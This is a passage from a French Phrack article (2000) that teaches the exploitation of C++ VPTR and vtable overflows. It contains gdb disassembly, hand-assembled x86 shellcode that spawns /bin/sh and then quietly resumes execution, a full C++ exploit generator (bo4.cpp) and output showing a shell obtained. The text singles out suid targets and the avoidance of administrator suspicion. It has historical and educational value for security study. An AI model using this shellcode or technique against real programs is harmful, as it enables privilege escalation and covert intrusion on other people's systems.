+0x80486ba <main+74>:    addl   $0xc,%esp
+0x80486bd <main+77>:    movl   %eax,%eax
+0x80486bf <main+79>:    pushl  %eax
+0x80486c0 <main+80>:    movl   0xfffffff8(%ebp),%eax
+0x80486c3 <main+83>:    pushl  %eax
+0x80486c4 <main+84>:    call   0x8048790 <SetBuffer__9BaseClassPc>
+0x80486c9 <main+89>:    addl   $0x8,%esp
+0x80486cc <main+92>:    pushl  $0x80489f6
+0x80486d1 <main+97>:    movl   0xfffffffc(%ebp),%eax
+0x80486d4 <main+100>:   pushl  %eax
+0x80486d5 <main+101>:   call   0x8048790 <SetBuffer__9BaseClassPc>
+0x80486da <main+106>:   addl   $0x8,%esp
+0x80486dd <main+109>:   movl   0xfffffff8(%ebp),%eax
+0x80486e0 <main+112>:   movl   0x20(%eax),%ebx
+0x80486e3 <main+115>:   addl   $0x8,%ebx
+0x80486e6 <main+118>:   movswl (%ebx),%eax
+0x80486e9 <main+121>:   movl   %eax,%edx
+0x80486eb <main+123>:   addl   0xfffffff8(%ebp),%edx
+---Type <return> to continue, or q <return> to quit---
+0x80486ee <main+126>:   pushl  %edx
+0x80486ef <main+127>:   movl   0x4(%ebx),%edi
+0x80486f2 <main+130>:   call   *%edi
+0x80486f4 <main+132>:   addl   $0x4,%esp
+0x80486f7 <main+135>:   movl   0xfffffffc(%ebp),%eax
+0x80486fa <main+138>:   movl   0x20(%eax),%esi
+0x80486fd <main+141>:   addl   $0x8,%esi
+0x8048700 <main+144>:   movswl (%esi),%eax
+0x8048703 <main+147>:   movl   %eax,%edx
+0x8048705 <main+149>:   addl   0xfffffffc(%ebp),%edx
+0x8048708 <main+152>:   pushl  %edx
+0x8048709 <main+153>:   movl   0x4(%esi),%edi
+0x804870c <main+156>:   call   *%edi
+0x804870e <main+158>:   addl   $0x4,%esp
+0x8048711 <main+161>:   xorl   %eax,%eax
+0x8048713 <main+163>:   jmp    0x8048720 <main+176>
+0x8048715 <main+165>:   leal   0x0(%esi,1),%esi
+0x8048719 <main+169>:   leal   0x0(%edi,1),%edi
+0x8048720 <main+176>:   leal   0xffffffec(%ebp),%esp
+0x8048723 <main+179>:   popl   %ebx
+0x8048724 <main+180>:   popl   %esi
+0x8048725 <main+181>:   popl   %edi
+0x8048726 <main+182>:   movl   %ebp,%esp
+0x8048728 <main+184>:   popl   %ebp
+---Type <return> to continue, or q <return> to quit---
+0x8048729 <main+185>:   ret
+0x804872a <main+186>:   leal   0x0(%esi),%esi
+End of assembler dump.
+
+Nous allons tout de meme installer un breakpoint en 0x8048690, pour obtenir
+l'adresse de notre 1er objet.
+
+(gdb) break *0x8048690
+Breakpoint 1 at 0x8048690
+
+Enfin, nous lancons l'execution de notre programme:
+
+(gdb) run
+Starting program: /home/rix/BO/bo3
+Breakpoint 1, 0x8048690 in main ()
+
+Nous lisons l'adresse de notre objet 1:
+
+(gdb) info reg eax
+     eax:  0x8049b38   134519608
+
+Puis nous poursuivons, en esperant que tout se passe comme prevu... :)
+
+Continuing.
+Program received signal SIGTRAP, Trace/breakpoint trap.
+0x8049b58 in ?? ()
+
+Nous recevons bien un SIGTRAP, provoque par l'instruction precedant l'adresse
+0x8049b58. Or, l'adresse de notre objet etait 0x8049b38.
+0x8049b58-1-0x8049b38=0x1F (=31), ce qui est exactemment l'offset de notre
+CCh dans notre buffer. Donc, c'est bien notre CCh qui a ete execute !!!
+Vous l'avez compris, il suffit maintenant de remplacer notre simple code CCh,
+par un petit shellcode, du style de celui de Aleph One par exemple, pour obtenir
+des resultats plus interessants, surtout si notre programme bo3 est suid... ;)
+
+
+Variations de la methode
+========================
+Nous avons ici expliquer le mecanisme le plus simple qui est exploitable.
+D'autres cas interessants plus complexes pourraient eventuellement apparaitre...
+Par exemple, nous pourrions avoir des associations entre classes ressemblant
+a ceci:
+
+class MyClass3 { 
+private:
+ char Buffer3[32];
+ MyClass1 *PtrObjectClass;
+public:
+ virtual void Function1() {
+  ...
+  PtrObjectClass1->PrintBuffer();
+  ...
+ }
+};
+
+Danc ce cas, nous avons une relation appelee aggregation par reference.
+C'est a dire que notre classe MyClass3 contient un pointeur vers une autre
+classe. Si nous depassons la capacite de Buffer dans la classe MyClass3, nous
+pouvons aller ecraser le pointeur PtrObjectClass, et donc, nous rapprocher de la
+technique expliquee plus haut, en necessitant cependant un parcourt de pointeur
+supplementaire:
+
+ +---------------------------------------------------+
+ |						     |
+ +-> VTABLE_MyClass3: IIIIIIIIIIIIRRRR               |
+                                                    =+==
+objet MyClass3: BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBPPPPXXXX
+                				==+=
+   					          |
+ +---------------------<--------------------------+
+ |
+ +--> objet MyClass1: CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCYYYY
+     			                              ==+=
+					                |
+ +------------------------------------------------------+
+ |
+ +--> VTABLE_MyClass1: IIIIIIIIIIIIQQQQ
+
+Ou: B represente des bytes du Buffer de MyClass4.
+    C represente des bytes du Buffer de MyClass1.
+    P represente des bytes d'un pointeur vers un objet de classe MyClass1.
+    X represente des bytes du VPTR eventuel de l'objet de classe MyClass4
+     (il n'est pas necessaire d'avoir un VPTR dans la classe contenant le
+      pointeur).
+    Y represente des bytes du VPTR de l'objet de classe MyClass1.
+
+Cette technique ne depend plus ici de la structure de la classe interne au
+compilateur (de l'offset de VPTR), mais bien de la structure de la classe
+definie par le programmeur, et donc elle peut etre exploitee meme dans des
+programmes provenant de compilateurs placant le VPTR au debut de l'objet en
+memoire (par exemple Visual C++).
+De plus, dans ce cas, l'objet de classe MyClass3 peut eventuellement avoir ete
+cree sur la pile (objet local), ce qui fait que la localisation est beaucoup
+plus facile, etant donne que l'adresse de l'objet sera probablement fixe.
+Cependant, il faudra alors que ce soit notre pile qui soit executable, et non
+plus notre heap comme precedemment.
+
+Nous savons aussi assez facilemment evaluer 2 des 3 parametres de notre fonction
+BufferOverflow, a savoir les parametres representant le nombre d'adresses de la
+VTABLE, et l'offset du VPTR. En effet ces 2 parametres peuvent etre facilemment
+etablis en debuggant un petit peu le code du programme, et de plus, leur valeur
+ne depend pas de l'execution.
+Par contre, le 1er parametre (adresse de l'objet en memoire), est plus difficile
+a etablir. En fait, nous avons besoin de cette adresse uniquement parce que nous
+voulons placer la VTABLE que nous avons creee dans le buffer.
+
+
+Exemple particulier
+===================
+Nous allons maintenant supposer un cas particulier.
+Supposons que nous ayons une classe dont la derniere variable soit un buffer
+exploitable. Cela veut dire que si nous remplissons ce buffer (prevu pour N
+bytes), avec N+4 bytes, nous savons que nous n'avons rien modifie d'autre dans
+l'espace memoire du processus que le contenu de notre buffer,le VPTR et le byte
+suivant notre VPTR (car caractere 00h de fin de chaine).
+
+Nous pourrions donc profiter de cet avantage. Comment ?
+Nous allons essayer de profiter du buffer, pour lancer un shellcode, puis pour
+poursuivre l'execution du programme exploite !
+L'avantage sera enorme, puisque le programme ne serait pas termine brutalement,
+d'ou aucune inquietude de la part de l'administrateur du systeme, par exemple...
+
+Est-ce possible ?
+Il faudrait d'abord executer notre shellcode, reecrire une chaine dans notre
+buffer, et restaurer la pile dans l'etat initial (juste avant l'appel de 
+notre methode). Ensuite, il ne nous resterait plus qu'a rappeler la methode
+initiale, pour que le programme continue normalement.
+
+Voici plusieurs problemes et remarques que nous allons rencontrer:
+- il faut reecrire dans notre buffer (pour que la suite de l'execution utilise
+ une valeur convenable), et donc ecraser notre propre shellcode.
+ Pour eviter cela, nous allons devoir recopier une partie de notre shellcode (
+ la plus petite partie possible) a un autre endroit dans la memoire.
+ Dans ce cas-ci, nous allons recopier une partie de notre shellcode sur la pile
+ (nous appellerons cette partie de code "stackcode"). Cela ne devrait pas poser
+ de problemes si notre pile est executable. 
+- Nous avions mentionne auparavant une manipulation etrange, qui consistait a
+ ajouter un offset a l'adresse de notre objet, et a place ce resultat sur la
+ pile, ce qui fournissait le pointeur This a la methode executee.
+ Le probleme est qu'ici, l'offset qui va etre rajoute a l'adresse de notre objet
+ va etre prit dans notre VTABLE, et que cet offset ne peut pas etre nul (puisque
+ nous ne pouvons avoir des caracteres nuls dans notre buffer).
+ Nous allons donc devoir choisir une valeur arbitraire pour cet offset, que nous
+ placerons dans notre VTABLE, et resoustraire cette valeur du pointeur This
+ auquel elle aura ete ajoutee, des le debut de notre shellcode.
+- nous allons devoir faire un fork() sur notre process, lancer l'execution du
+ shell (exec()), et attendre sa terminaison (wait()), pour enfin pouvoir
+ continuer notre execution.
+- l'emplacement ou nous continuerons notre execution est constant, il s'agit
+ de l'adresse de la methode (presente dans la VTABLE de la classe relative a
+ notre objet).
+- nous savons que nous pouvons utiliser notre registre eax, car celui-ci serait
+ de toute maniere ecrase par la valeur de retour de notre methode.
+- nous ne pouvons inclure aucun caractere 00h dans notre buffer, donc nous
+ devrons regenerer ces caracteres (pour les fins de chaines eventuelles) en
+ cours d'execution.
+
+En utilisant tout ces points importants, nous allons donc essayer de construire
+un buffer selon le schema suivant:
+
+ +------------------------------------<-(1)---------------------------------+
+ |   notre VTABLE                                                           |
+=+===================                                                     ==+=
+9999TT999999.... MMMM SSSS0000/bin/shAAA.... A BBB... Bnewstring99999.... VVVVL
+                 ==+= ==+=    |      |       | ========
+                   |    |     |      |       |      \
+		   |    +-->--+      |       |        \(copie sur la pile)
+		   |                 |       |      ========
+		   +---(2)-->--------+       |      BBB... B
+                                             |      |      |
+                                             +-(3)->+      +--> ancienne methode
+Ou: 9 represente des bytes quelconques de remplissage (90h,NOPs ?).
+    T represente les bytes formant le mot de l'offset ajoute au pointeur sur
+     la pile (manipulation etrange ;).
+    M represente l'adresse dans notre buffer du debut de notre shellcode.
+    S represente l'adresse dans notre buffer de la chaine "/bin/sh".
+    0 represente des bytes 90h, mais qui devront etre initialises a nul lors
+     de l'execution de notre code (necessaires pour l'appel a exec()).
+    /bin/sh represente la chaine "/bin/sh", sans caractere de terminaison 00h,
+     qui devra donc etre rajoute par la suite.
+    A represente un byte de notre shellcode: celui ci devra principalement
+     executer le shell, puis copier le stackcode sur la pile et ensuite
+     l'executer.
+    B represente un byte de notre stackcode: celui ci devra principalement
+     reinitialiser notre buffer avec une nouvelle chaine, et executer la
+     methode originale pour poursuivre l'execution du programme.
+    newstring represente la chaine "newstring", qui sera recopiee dans le buffer
+     apres execution du shell, pour poursuivre l'execution.
+    V represente un byte du VPTR, qui doit repointe vers le debut de notre
+     buffer (vers notre VTABLE).
+    L represente le byte qui sera copie apres le VPTR, et qui sera un byte 00h.
+
+De maniere plus detaillee, voici le contenu de nos shellcode et stackcode:
+
+
+pushl  %ebp                             //sauvegarde EBP existant
+movl   %esp,%ebp                        //creation d'un stack frame
+xorl   %eax,%eax                        //EAX=0
+movb   $0x31,%al                        //EAX=$StackCodeSize (taille du code qui
+					// va etre copie sur la pile)
+subl   %eax,%esp                        //creation d'une variable locale pour
+					//stocker notre stackcode
+pushl  %edi
+pushl  %esi
+pushl  %edx
+pushl  %ecx
+pushl  %ebx                             //sauvegarde des registres
+pushf                                   //sauvegarde des flags
+cld                                     //flag de direction=incrementer
+xorl   %eax,%eax                        //EAX=0
+movw   $0x101,%ax                       //EAX=$AddThis (valeur qui est ajoutee
+					// lors du calcul du This sur la pile)
+subl   %eax,0x8(%ebp)                   //on soustrait cette valeur de la
+					//valeur courant du This sur la pile,
+					//pour restaurer le This original
+xorl   %eax,%eax                        //EAX=0
+movl   $0x804a874,%edi                  //EDI=$BufferAddress+$NullOffset
+					// (adresse du dword NULL dans notre
+					// buffer)					
+stosl  %eax,%es:(%edi)                  //on ecrit ce dword NULL dans le buffer
+movl   $0x804a87f,%edi                  //EDI=$BufferAddress+$BinSh00Offset
+					// (adresse du 00h de fin de chaine
+					// de "/bin/sh")
+stosb  %al,%es:(%edi)                   //on ecrit ce 00h de fin de chaine
+movb   $0x2,%al
+int    $0x80                            //fork()
+xorl   %edx,%edx                        //EDX=0
+cmpl   %edx,%eax
+jne    0x804a8c1			//si EAX=0 on saute a PERE
+					// (EAX=0 si process pere)
+
+movb   $0xb,%al                         //sinon on est le process fils
+movl   $0x804a878,%ebx                  //EBX=$BufferAddress+$BinShOffset
+					// (adresse de "/bin/sh")
+movl   $0x804a870,%ecx			//ECX=$BufferAddress+$BinShAddressOffset
+					// (adresse de l'adresse de "/bin/sh")
+xorl   %edx,%edx                        //EDX=0h (NULL)
+int    $0x80                            //exec() de "/bin/sh"
+
+PERE:
+movl   %edx,%esi                        //ESI=0
+movl   %edx,%ecx			//ECX=0
+movl   %edx,%ebx			//EBX=0
+notl   %ebx				//EBX=0xFFFFFFFF
+movl   %edx,%eax			//EAX=0
+movb   $0x72,%al			//EAX=0x72
+int    $0x80				//wait() (attend la fin de l'execution
+					// du shell)
+xorl   %ecx,%ecx			//ECX=0
+movb   $0x31,%cl			//ECX=$StackCodeSize
+movl   $0x804a8e2,%esi			//ESI=$BufferAddress+$StackCodeOffset
+					// (adresse de debut du stackcode)
+movl   %ebp,%edi			//EDI pointe vers le dessus de notre
+					// variable locale
+subl   %ecx,%edi			//EDI pointe au debut de notre variable
+					// locale
+movl   %edi,%edx			//EDX pointe aussi vers le debut de
+					// notre variable locale
+repz movsb %ds:(%esi),%es:(%edi)	//copie notre stackcode dans notre
+					// variable locale sur la pile
+jmp    *%edx				//execute notre stackcode sur la pile
+
+stackcode:
+movl   $0x804a913,%esi			//ESI=$BufferAddress+$NewBufferOffset
+					// (pointe sur la nouvelle chaine que
+					// nous voulons placer dans le buffer)
+movl   $0x804a860,%edi			//EDI=$BufferAddress (pointe sur le
+					// debut de notre buffer)
+xorl   %ecx,%ecx			//ECX=0
+movb   $0x9,%cl				//ECX=$NewBufferSize (longueur de notre
+					// nouvelle chaine)
+repz movsb %ds:(%esi),%es:(%edi)        //copie notre nouvelle chaine au debut
+					// du buffer
+xorb   %al,%al				//AL=0
+stosb  %al,%es:(%edi)			//termine cette nouvelle chaine par 00h
+movl   $0x804a960,%edi			//EDI=$BufferAddress+$VPTROffset
+					// (adresse du VPTR)
+movl   $0x8049730,%eax			//EAX=$VTABLEAddress (adresse de la
+					// VTABLE originale de notre classe)
+movl   %eax,%ebx			//EBX=$VTABLEAddress
+stosl  %eax,%es:(%edi)			//corrige le VPTR pour qu'il repointe
+					// vers la VTABLE originale
+movb   $0x29,%al			//AL=$LastByte (contenu du byte juste
+					// apres notre VPTR en memoire)
+stosb  %al,%es:(%edi)			//on corrige ce byte
+movl   0xc(%ebx),%eax			//EAX=*VTABLEAddress+IAddress*4
+					// (EAX va donc chercher l'adresse de
+					// la methode originale dans la VTABLE
+					// originale)
+popf
+popl   %ebx
+popl   %ecx
+popl   %edx
+popl   %esi
+popl   %edi				//restaure flags et registres
+movl   %ebp,%esp
+popl   %ebp				//supprime le stack frame
+jmp    *%eax				//saute vers la methode originale
+
+
+Nous devons donc maintenant coder une fonction BufferOverflow() qui va nous
+"compiler" le shellcode et le stackcode, et creer la structure de notre buffer.
+Voici les parametres que nous devrons passer a cette fonction:
+- BufferAddress = adresse de notre buffer en memoire.
+- IAddress = indice dans la VTABLE de la 1ere methode qui sera executee.
+- VPTROffset = offset dans notre buffer du VPTR a ecraser.
+- AddThis = valeur qui sera ajoutee au pointeur This sur la pile, a cause de
+ la "manipulation etrange".
+- VTABLEAddress = adresse de la VTABLE originale de notre classe (codee dans
+ l'executable).
+- *NewBuffer = un pointeur vers la nouvelle chaine que nous voulons placer dans
+ notre buffer pour poursuivre l'execution du programme normalement.
+- LastByte = le byte original suivant le VPTR en memoire, qui est ecrase lors
+ de la copie de notre buffer dans le buffer original, a cause du 00h.
+
+Voici le code resultant du programme qui effectue tout cela (bo4.cpp):
+
+
+#include <stdio.h>
+#include <string.h>
+#include <malloc.h>
+
+#define BUFFERSIZE 256
+
+class BaseClass { 
+private:
+ char Buffer[BUFFERSIZE];
+public:
+ void SetBuffer(char *String) {
+  strcpy(Buffer,String);
+ }
+ virtual void PrintBuffer() {
+  printf("%s\n",Buffer);
+ }
+};
+
+class MyClass1:public BaseClass {
+public:
+ void PrintBuffer() {
+  printf("MyClass1: ");
+  BaseClass::PrintBuffer();
+ }
+};
+
+class MyClass2:public BaseClass {
+public:
+ void PrintBuffer() {
+  printf("MyClass2: ");
+  BaseClass::PrintBuffer();
+ }
+};
+
+ // structure Buffer: 9999 9999 TTTT 9999 .. CCCC S .. 1111 2222 BBBBBBB0UUUUU .. VVVV E
+ // T=AddThis
+ // C=Ptr vers debut du code
+ // S=shellcode
+ // 1=byte du 1er pointeur vers BBBB
+ // 2=byte du ptr NULL
+ // B=chaine /bin/sh
+ // 0=caractere servant de 00h
+ // U=byte remplacement buffer
+ // V=VPTR vers le debut du buffer
+ // E=byte d'ecrasement apres VPTR */
+
+char *BufferOverflow(unsigned long BufferAddress,int IAddress,int VPTROffset,
+ unsigned short AddThis,unsigned long VTABLEAddress,char *NewBuffer,char LastByte) {
+
+ char *CBuf;
+ unsigned long *LBuf;
+ unsigned short *SBuf;
+ char BinShSize,ShellCodeSize,StackCodeSize,NewBufferSize;
+ unsigned long i,  
+  MethodAddressOffset,BinShAddressOffset,NullOffset,BinShOffset,BinSh00Offset,
+  ShellCodeOffset,StackCodeOffset,
+  NewBufferOffset,NewBuffer00Offset,
+  LastByteOffset;  
+ char *BinSh="/bin/sh";
+ 
+ CBuf=(char*)malloc(VPTROffset+4+1);
+ LBuf=(unsigned long*)CBuf;
+ 
+ BinShSize=(char)strlen(BinSh);
+ ShellCodeSize=0x62;
+ StackCodeSize=0x91+2-0x62;
+ NewBufferSize=(char)strlen(NewBuffer);
+ 
+ MethodAddressOffset=IAddress*4;
+ BinShAddressOffset=MethodAddressOffset+4;
+ NullOffset=MethodAddressOffset+8;
+ BinShOffset=MethodAddressOffset+12;
+ BinSh00Offset=BinShOffset+(unsigned long)BinShSize;
+ ShellCodeOffset=BinSh00Offset+1;
+ StackCodeOffset=ShellCodeOffset+(unsigned long)ShellCodeSize;
+ NewBufferOffset=StackCodeOffset+(unsigned long)StackCodeSize;
+ NewBuffer00Offset=NewBufferOffset+(unsigned long)NewBufferSize;
+ LastByteOffset=VPTROffset+4;
+
+ for (i=0;i<VPTROffset;i++) CBuf[i]='\x90'; //NOPs
+ SBuf=(unsigned short*)&LBuf[2];
+ *SBuf=AddThis; //ajoute par le programme a l'adresse This 
+ 
+ LBuf=(unsigned long*)&CBuf[MethodAddressOffset];
+ *LBuf=BufferAddress+ShellCodeOffset; //adresse du shellcode
+ 
+ LBuf=(unsigned long*)&CBuf[BinShAddressOffset];
+ *LBuf=BufferAddress+BinShOffset; //adresse de "/bin/sh"
+
+ memcpy(&CBuf[BinShOffset],BinSh,BinShSize); //chaine "/bin/sh"
+
+ //shellcode:
+  
+ i=ShellCodeOffset;
+ CBuf[i++]='\x55';                                   //pushl %ebp
+ CBuf[i++]='\x89';CBuf[i++]='\xE5';                  //movl %esp,%ebp
+ CBuf[i++]='\x31';CBuf[i++]='\xC0';                  //xorl %eax,%eax
+ CBuf[i++]='\xB0';CBuf[i++]=StackCodeSize;           //movb $StackCodeSize,%al
+ CBuf[i++]='\x29';CBuf[i++]='\xC4';                  //subl %eax,%esp
+ 
+ CBuf[i++]='\x57';                                   //pushl %edi
+ CBuf[i++]='\x56';                                   //pushl %esi
+ CBuf[i++]='\x52';                                   //pushl %edx 
+ CBuf[i++]='\x51';                                   //pushl %ecx 
+ CBuf[i++]='\x53';                                   //pushl %ebx  
+ CBuf[i++]='\x9C';                                   //pushf
+ 
+ CBuf[i++]='\xFC';                                   //cld
+
+ CBuf[i++]='\x31';CBuf[i++]='\xC0';                  //xorl %eax,%eax
+ CBuf[i++]='\x66';CBuf[i++]='\xB8';                  //movw $AddThis,%ax
+ SBuf=(unsigned short*)&CBuf[i];*SBuf=AddThis;i=i+2;
+ CBuf[i++]='\x29';CBuf[i++]='\x45';CBuf[i++]='\x08'; //subl %eax,0x8(%ebp)
+
+ CBuf[i++]='\x31';CBuf[i++]='\xC0';                  //xorl %eax,%eax
+ 
+ CBuf[i++]='\xBF';                        //movl $BufferAddress+$NullOffset,%edi
+ LBuf=(unsigned long*)&CBuf[i];*LBuf=BufferAddress+NullOffset;i=i+4;  
+ CBuf[i++]='\xAB';                                   //stosl %eax,%es:(%edi)
+
+ CBuf[i++]='\xBF';                     //movl $BufferAddress+$BinSh00Offset,%edi
+ LBuf=(unsigned long*)&CBuf[i];*LBuf=BufferAddress+BinSh00Offset;i=i+4;
+ CBuf[i++]='\xAA';                                   //stosb %al,%es:(%edi)
+
+ CBuf[i++]='\xB0';CBuf[i++]='\x02';                  //movb $0x2,%al
+ CBuf[i++]='\xCD';CBuf[i++]='\x80';                  //int $0x80 (fork())
+ 
+ CBuf[i++]='\x31';CBuf[i++]='\xD2';                  //xorl %edx,%edx
+ CBuf[i++]='\x39';CBuf[i++]='\xD0';                  //cmpl %edx,%eax
+ CBuf[i++]='\x75';CBuf[i++]='\x10';                  //jnz +$0x10 (-> PERE)
+
+ CBuf[i++]='\xB0';CBuf[i++]='\x0B';                  //movb $0xB,%al
+ CBuf[i++]='\xBB';                       //movl $BufferAddress+$BinShOffset,%ebx
+ LBuf=(unsigned long*)&CBuf[i];*LBuf=BufferAddress+BinShOffset;i=i+4; 
+ CBuf[i++]='\xB9';                //movl $BufferAddress+$BinShAddressOffset,%ecx
+ LBuf=(unsigned long*)&CBuf[i];*LBuf=BufferAddress+BinShAddressOffset;i=i+4; 
+ CBuf[i++]='\x31';CBuf[i++]='\xD2';                  //xorl %edx,%edx
+ CBuf[i++]='\xCD';CBuf[i++]='\x80';                  //int $0x80 (execve())
+ 
+                                                     //PERE:
+ CBuf[i++]='\x89';CBuf[i++]='\xD6';                  //movl %edx,%esi
+ CBuf[i++]='\x89';CBuf[i++]='\xD1';                  //movl %edx,%ecx
+ CBuf[i++]='\x89';CBuf[i++]='\xD3';                  //movl %edx,%ebx
+ CBuf[i++]='\xF7';CBuf[i++]='\xD3';                  //notl %ebx
+ CBuf[i++]='\x89';CBuf[i++]='\xD0';                  //movl %edx,%eax
+ CBuf[i++]='\xB0';CBuf[i++]='\x72';                  //movb $0x72,%al
+ CBuf[i++]='\xCD';CBuf[i++]='\x80';                  //int $0x80 (wait())
+ 
+ CBuf[i++]='\x31';CBuf[i++]='\xC9';                  //xorl %ecx,%ecx
+ CBuf[i++]='\xB1';CBuf[i++]=StackCodeSize;           //movb $StackCodeSize,%cl
+
+ CBuf[i++]='\xBE';                   //movl $BufferAddress+$StackCodeOffset,%esi
+ LBuf=(unsigned long*)&CBuf[i];*LBuf=BufferAddress+StackCodeOffset;i=i+4; 
+
+ CBuf[i++]='\x89';CBuf[i++]='\xEF';                  //movl %ebp,%edi
+ CBuf[i++]='\x29';CBuf[i++]='\xCF';                  //subl %ecx,%edi
+ CBuf[i++]='\x89';CBuf[i++]='\xFA';                  //movl %edi,%edx
+ 
+ CBuf[i++]='\xF3';CBuf[i++]='\xA4';           //repz movsb %ds:(%esi),%es:(%edi)
+
+ CBuf[i++]='\xFF';CBuf[i++]='\xE2';                  //jmp *%edx (stackcode)
+
+ //stackcode:
+ 
+ CBuf[i++]='\xBE';                   //movl $BufferAddress+$NewBufferOffset,%esi
+ 
+ LBuf=(unsigned long*)&CBuf[i];*LBuf=BufferAddress+NewBufferOffset;i=i+4; 
+ CBuf[i++]='\xBF';                                   //movl $BufferAddress,%edi
+ LBuf=(unsigned long*)&CBuf[i];*LBuf=BufferAddress;i=i+4; 
+ CBuf[i++]='\x31';CBuf[i++]='\xC9';                  //xorl %ecx,%ecx
+ CBuf[i++]='\xB1';CBuf[i++]=NewBufferSize;           //movb $NewBufferSize,%cl
+ CBuf[i++]='\xF3';CBuf[i++]='\xA4';           //repz movsb %ds:(%esi),%es:(%edi)
+
+ CBuf[i++]='\x30';CBuf[i++]='\xC0';                  //xorb %al,%al
+ CBuf[i++]='\xAA';                                   //stosb %al,%es:(%edi)
+
+ CBuf[i++]='\xBF';                        //movl $BufferAddress+$VPTROffset,%edi
+ LBuf=(unsigned long*)&CBuf[i];*LBuf=BufferAddress+VPTROffset;i=i+4; 
+ CBuf[i++]='\xB8';                                   //movl $VTABLEAddress,%eax
+ LBuf=(unsigned long*)&CBuf[i];*LBuf=VTABLEAddress;i=i+4; 
+ CBuf[i++]='\x89';CBuf[i++]='\xC3';                  //movl %eax,%ebx
+ CBuf[i++]='\xAB';                                   //stosl %eax,%es:(%edi)
+
+ CBuf[i++]='\xB0';CBuf[i++]=LastByte;                //movb $LastByte,%al
+ CBuf[i++]='\xAA';                                   //stosb %al,%es:(%edi)
+
+ CBuf[i++]='\x8B';CBuf[i++]='\x43';
+ CBuf[i++]=(char)4*IAddress;                       //movl $4*Iaddress(%ebx),%eax
+
+ CBuf[i++]='\x9D';                                   //popf
+ CBuf[i++]='\x5B';                                   //popl %ebx
+ CBuf[i++]='\x59';                                   //popl %ecx
+ CBuf[i++]='\x5A';                                   //popl %edx
+ CBuf[i++]='\x5E';                                   //popl %esi
+ CBuf[i++]='\x5F';                                   //popl %edi
+
+ CBuf[i++]='\x89';CBuf[i++]='\xEC';                  //movl %ebp,%esp
+ CBuf[i++]='\x5D';                                   //popl %ebp
+ 
+ CBuf[i++]='\xFF';CBuf[i++]='\xE0';                  //jmp *%eax
+ 
+ memcpy(&CBuf[NewBufferOffset],NewBuffer,(unsigned long)NewBufferSize);
+  //copie la chaine du nouveau buffer
+ 
+ LBuf=(unsigned long*)&CBuf[VPTROffset];
+ *LBuf=BufferAddress; //adresse de notre VTABLE
+
+ CBuf[LastByteOffset]=0; //dernier byte du buffer
+
+ return CBuf;
+}
+
+void main() {
+ BaseClass *Object[2];
+ unsigned long *VTABLEAddress;
+
+ Object[0]=new MyClass1;
+ Object[1]=new MyClass2; 
+
+ printf("adresse Object[0] = %X\n",(unsigned long)&(*Object[0])); 
+ VTABLEAddress=(unsigned long*) ((char*)&(*Object[0])+256);
+ printf("adresse VTable = %X\n",*VTABLEAddress);
+ 
+ Object[0]->SetBuffer(BufferOverflow((unsigned long)&(*Object[0]),3,BUFFERSIZE,
+  0x0101,*VTABLEAddress,"newstring",0x29)); 
+  
+ Object[1]->SetBuffer("string2");
+ Object[0]->PrintBuffer();
+ Object[1]->PrintBuffer();
+}
+
+
+Nous allons maintenant compiler et tester...
+
+rix@pentium:~/BO > gcc -o bo4 bo4.cpp
+rix@pentium:~/BO > bo4
+adresse Object[0] = 804A860
+adresse VTable = 8049730
+sh-2.02$ exit
+exit
+MyClass1: newstring
+MyClass2: string2
+rix@pentium:~/BO >
+
+Et comme prevu, notre shell s'execute, puis notre programme poursuit son
+execution, avec une nouvelle chaine dans le buffer ("newstring") !!!
+
+
+Conclusion
+==========
+Pour a la fois resumer et conclure, notons que la technique de base necessite au
+prealable les conditions suivantes, pour etre utilisable avec succes:
+- un buffer d'une certaine taille minimale
+- programme suid
+- heap executable et/ou pile executable (suivant les techniques)
+- connaitre l'adresse du debut du buffer (sur le heap ou sur la pile)
+- connaitre l'offset a partir du debut du buffer du VPTR (constant pour toute
+   execution)
+- connaitre l'offset dans la VTABLE du pointeur vers la 1ere methode executee
+   apres l'overflow (constant pour toute execution)
+- connaitre l'adresse de la VTABLE si nous voulons poursuivre l'execution du
+   programme correctement.
+
+Cet article vous aura donc montre une fois de plus que les pointeurs, qui
+prennent de plus en plus de place dans la programmation moderne, sont bien
+pratiques, mais peuvent aussi malheureusement se reveler tres dangereux.
+
+Nous remarquons donc que des languages puissants comme le C++, comportent malgre
+tout toujours certaines faiblesses, et que ce n'est pas grace a un language
+quelconque qu'un programme est bien securise, mais bien principalement grace aux
+competences et a la maitrise de ses concepteurs...
+
+Thanks to: route,klog,mayhem,nite,darkbug
+                                                              rix, Phrack 2000
+                              rix@exile2k.org,rix@dreamnet.org,rix@advalvas.be
